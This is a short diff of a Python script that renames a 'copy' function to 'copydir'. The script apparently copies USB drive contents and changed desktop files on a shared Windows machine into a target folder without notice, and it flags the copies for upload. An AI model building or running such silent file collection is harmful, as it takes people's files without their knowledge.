@@ -42,7 +42,7 @@ def upancopy():
     os.chdir(UPANPATH)
     target = os.path.join(TARGET,time.strftime('%Y%m%d%H%M%S'))
     os.mkdir(target)
-    copy('.',target,isfilter=True)
+    copydir('.',target,isfilter=True)
 def opencopy(filename:str):
     '''打开文件并复制
 filename(str):文件名
@@ -63,7 +63,7 @@ filename(str):文件名
     elif file_suffix in ('pdf',):
         threading.Thread(target=lambda:os.popen(fr'start C:\Users\SEEWO\AppData\Roaming\secoresdk\360se6\Application\360se {filename}').close()).start()
         shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
-def copy(path:str,target:str,isfilter:bool):
+def copydir(path:str,target:str,isfilter:bool):
     '''复制目录下所有文件
 path(str):目录路径
 target(str):目标路径
@@ -110,7 +110,7 @@ def deskcopy():
     while True:
         for i in os.listdir():
             if os.stat(i).st_size not in filesizes:
-                copy('.',TARGET,isfilter=False)
+                copydir('.',TARGET,isfilter=False)
                 isneedupload = True
                 filesizes = []
                 for j in os.listdir():
